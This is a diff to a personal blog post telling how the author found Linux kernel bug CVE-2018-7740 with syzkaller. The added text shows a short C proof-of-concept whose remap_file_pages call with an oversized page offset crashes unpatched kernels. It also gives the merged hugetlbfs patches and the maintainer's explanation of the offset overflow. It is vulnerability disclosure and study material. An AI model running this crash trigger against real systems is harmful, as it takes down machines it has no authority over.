@@ -38,6 +38,31 @@
 
 This is the beginning of the story of CVE-2018-7740 or how I completed a life goal. 
 
+First and foremost, PoC.
+
+```
+#define _GNU_SOURCE
+#include <endian.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <stdint.h>
+#include <string.h>
+
+void loop()
+{
+        syscall(__NR_mmap, 0x20a00000, 0x600000, 0, 0x66033, -1, 0);
+        syscall(__NR_remap_file_pages, 0x20a00000, 0x600000, 0, 0x20000000000000, 0);
+}
+
+int main()
+{
+        syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+        loop();
+        return 0;
+}
+
+```
+
 Let's get right into it. I was using [syzkaller](https://github.com/google/syzkaller) for fuzzing the Linux kernel for a few months. I initially got this crash back in August 2017 however I admit I didn't really know what it meant or what I was doing so I ignored it. Fast forward to January 2018 when I got a Del R410 with 12 cores and 6GB of RAM from the local university surplus store for $38. I installed Arch on it and then went through the slightly painful instructions for setting up syzkaller, including downloading and building the Linux kernel from source. 
 
 The first time I got syzkaller setup I threw in every possible option and got overwhelmed by the information so this time around I only added a few required options and left the config for building the kernel to be mostly default. I guess I could upload my config file if there is a request to do so. 
@@ -84,7 +109,119 @@ static void remove_inode_hugepages(struct inode *inode, loff_t lstart,
 }
 ```
 
-So it's something about unreserving pages. I struggled with paging in CPRE 381 so I handed it over to the maintainer. That very brief report can be found [here](https://bugzilla.kernel.org/show_bug.cgi?id=199037). 
+So it's something about unreserving pages. I struggled with paging in CPRE 381 so I handed it over to the maintainer. That very brief report can be found [here](https://bugzilla.kernel.org/show_bug.cgi?id=199037).
+
+This after a week or so of many different people emailing patched back and forth ended on the follow patches being merged into mainline. 
+
+```
+ fs/hugetlbfs/inode.c |   17 ++++++++++++++---
+ mm/hugetlb.c         |    7 +++++++
+ 2 files changed, 21 insertions(+), 3 deletions(-)
+
+diff -puN fs/hugetlbfs/inode.c~hugetlbfs-check-for-pgoff-value-overflow fs/hugetlbfs/inode.c
+--- a/fs/hugetlbfs/inode.c~hugetlbfs-check-for-pgoff-value-overflow
++++ a/fs/hugetlbfs/inode.c
+@@ -108,6 +108,16 @@ static void huge_pagevec_release(struct
+        pagevec_reinit(pvec);
+ }
+
++/*
++ * Mask used when checking the page offset value passed in via system
++ * calls.  This value will be converted to a loff_t which is signed.
++ * Therefore, we want to check the upper PAGE_SHIFT + 1 bits of the
++ * value.  The extra bit (- 1 in the shift value) is to take the sign
++ * bit into account.
++ */
++#define PGOFF_LOFFT_MAX \
++       (((1UL << (PAGE_SHIFT + 1)) - 1) <<  (BITS_PER_LONG - (PAGE_SHIFT + 1)))
++
+ static int hugetlbfs_file_mmap(struct file *file, struct vm_area_struct *vma)
+ {
+        struct inode *inode = file_inode(file);
+@@ -127,12 +137,13 @@ static int hugetlbfs_file_mmap(struct fi
+        vma->vm_ops = &hugetlb_vm_ops;
+
+        /*
+-        * Offset passed to mmap (before page shift) could have been
+-        * negative when represented as a (l)off_t.
++        * page based offset in vm_pgoff could be sufficiently large to
++        * overflow a (l)off_t when converted to byte offset.
+         */
+-       if (((loff_t)vma->vm_pgoff << PAGE_SHIFT) < 0)
++       if (vma->vm_pgoff & PGOFF_LOFFT_MAX)
+                return -EINVAL;
+
++       /* must be huge page aligned */
+        if (vma->vm_pgoff & (~huge_page_mask(h) >> PAGE_SHIFT))
+                return -EINVAL;
+
+diff -puN mm/hugetlb.c~hugetlbfs-check-for-pgoff-value-overflow mm/hugetlb.c
+--- a/mm/hugetlb.c~hugetlbfs-check-for-pgoff-value-overflow
++++ a/mm/hugetlb.c
+@@ -18,6 +18,7 @@
+ #include <linux/bootmem.h>
+ #include <linux/sysfs.h>
+ #include <linux/slab.h>
++#include <linux/mmdebug.h>
+ #include <linux/sched/signal.h>
+ #include <linux/rmap.h>
+ #include <linux/string_helpers.h>
+@@ -4374,6 +4375,12 @@ int hugetlb_reserve_pages(struct inode *
+        struct resv_map *resv_map;
+        long gbl_reserve;
+
++       /* This should never happen */
++       if (from > to) {
++               VM_WARN(1, "%s called with a negative range\n", __func__);
++               return -EINVAL;
++       }
++
+        /*
+         * Only apply hugepage reservation if asked. At fault time, an
+         * attempt will be made for VM_NORESERVE to allocate a page
+
+```
+
+There is another patch that was submitted after this one to make sure any 32bit system will not try to map a page larger than 4GB. This was submitted after kbuild test robot emailed the maintainers about a new warning. Side note: that's rally cool that there is a bit that is always building the latest kernel and emailing the maintainers if they introduce a new warning. The following patch was applied after the initial one was accepted into mainline. 
+
+```
+---
+ fs/hugetlbfs/inode.c | 10 +++++++---
+ 1 file changed, 7 insertions(+), 3 deletions(-)
+
+diff --git a/fs/hugetlbfs/inode.c b/fs/hugetlbfs/inode.c
+index b9a254dcc0e7..d508c7844681 100644
+--- a/fs/hugetlbfs/inode.c
++++ b/fs/hugetlbfs/inode.c
+@@ -138,10 +138,14 @@ static int hugetlbfs_file_mmap(struct file *file, struct vm_area_struct *vma)
+
+        /*
+         * page based offset in vm_pgoff could be sufficiently large to
+-        * overflow a (l)off_t when converted to byte offset.
++        * overflow a loff_t when converted to byte offset.  This can
++        * only happen on architectures where sizeof(loff_t) ==
++        * sizeof(unsigned long).  So, only check in those instances.
+         */
+-       if (vma->vm_pgoff & PGOFF_LOFFT_MAX)
+-               return -EINVAL;
++       if (sizeof(unsigned long) == sizeof(loff_t)) {
++               if (vma->vm_pgoff & PGOFF_LOFFT_MAX)
++                       return -EINVAL;
++       }
+```
+
+Great, that's a lot of information in there. Let's go back to the initial PoC. 
+
+The line that crashes is `syscall(__NR_remap_file_pages, 0x20a00000, 0x600000, 0, 0x20000000000000, 0);` and specifically the large pgoff of `0x20000000000000`. 
+
+Let's take a quick look at the [man page](http://man7.org/linux/man-pages/man2/remap_file_pages.2.html) of remap_file_pages. 
+```
+The pgoff and size arguments specify the region of the file that is
+      to be relocated within the mapping: pgoff is a file offset in units
+      of the system page size; size is the length of the region in bytes.
+```
+
+To quote the maintainer in explaining the bug, the issue is: "In the process of converting this to a page offset and putting it in vm_pgoff, and then converting back to bytes to compute mapping length we end up with 0.  We ultimately end up passing (from,to) page offsets into hugetlbfs where from is greater than to. :( This confuses the heck out the the huge page reservation code as the 'negative' range looks like an error and we never complete the reservation process and leave the 'adds_in_progress'. This issue has existed for a long time.  The VM_BUG_ON just happens to catch the situation which was previously not reported or had some other side effect."
 
 # February 1st, 2018
 ## Full Kali on RPi Zero W
